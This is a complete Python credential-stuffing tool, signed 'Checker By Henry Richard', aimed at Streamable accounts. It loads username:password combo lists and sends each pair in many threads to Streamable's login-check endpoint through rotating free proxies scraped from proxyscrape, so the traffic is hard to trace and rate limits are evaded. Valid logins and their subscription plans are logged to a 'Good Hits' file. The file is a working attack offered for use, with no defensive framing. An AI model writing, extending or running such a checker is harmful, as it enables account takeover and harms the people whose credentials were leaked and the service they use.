import datetime
from random import choice
import concurrent.futures
import requests

start_time = datetime.datetime.now()


def get_proxies(proxy_type):
    url = f"https://api.proxyscrape.com/v2/?request=getproxies&protocol={proxy_type}&timeout=10000&country=all&ssl=all&anonymity=all"
    r = requests.get(url).text.split()
    return r


def random_proxy(proxy_type):
    if proxy_type == 'socks4':
        proxy = choice(proxies)
        return {"http": f'socks4://{proxy}', 'https': f'socks4://{proxy}'}

    elif proxy_type == 'socks5':
        proxy = choice(proxies)
        return {"http": f'socks5://{proxy}', 'https': f'socks5://{proxy}'}

    elif proxy_type == 'http':
        proxy = choice(proxies)
        return {"http": f'http://{proxy}', 'https': f'http://{proxy}'}


def write_to_file(**kwargs):
    open(f'Results\\[Good Hits] {start_time.strftime("%d-%m-%y %I-%M-%S-%p")}.txt', 'a').write(
        f"{' '.join('='.join(tup) for tup in kwargs.items())}\n"
        f"[=======Checker By Henry Richard=======]\n"
    )


def proxy_request(request_type, url, **kwargs):
    session = requests.session()
    while 1:
        try:
            proxy = random_proxy(proxy_type_)
            r = session.request(request_type, url, proxies=proxy, timeout=5, **kwargs).json()
            break
        except:
            pass
    return r


def checker(combo: str):
    username, password = combo.split(":")
    url = 'https://ajax.streamable.com/check'
    post_data = {
        "username": username,
        "password": password
    }
    r = proxy_request('post', url, json=post_data)

    if "ad_tags" in r:
        print(f"[GOOD] {username}:{password} Plan={r['plan_name']}")
        write_to_file(Email=username, Password=password, Plan=r['plan_name'])
    else:
        print(f"[BAD] {username}:{password}")


if __name__ == '__main__':
    threads = int(input('Amount Of Threads: '))
    combos = open(input('Combos Path: '), 'r').read().split()
    proxy_type_ = input('Proxy').lower()
    proxies = get_proxies(proxy_type_)

    with concurrent.futures.ThreadPoolExecutor(threads) as executor:
        executor.map(checker, combos)
